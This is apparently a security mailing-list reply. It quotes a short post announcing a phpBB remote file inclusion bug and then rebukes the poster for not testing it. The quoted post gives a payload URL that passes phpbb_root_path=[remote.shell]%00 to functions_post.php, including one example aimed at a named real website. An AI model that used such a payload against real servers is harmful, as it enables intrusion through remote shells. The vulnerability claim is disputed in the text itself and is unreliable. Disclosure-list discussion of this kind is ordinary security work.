"New bug found in phpBB, most pages vulnerable, theres more bugs,
I\'ll post one a week:

victim/phpBB2/includes/functions_post.php?phpbb_root_path=[remote.sh
ell]%00

For example:

http://www.phpbb.de/includes/functions_post.php?phpbb_root_path=[rem
ote.shell]%00

Enjoy :)

BUG BY REZEN! XORCREW! H4X H4X!"

Did you even read the code rezen? test your "vuln"? How about you
test what you find instead of posting everything you see to the
list and trying to get attention/fame? Leave vuln assessment/code
auditing to people who actually care about it, and stop playing as
one.
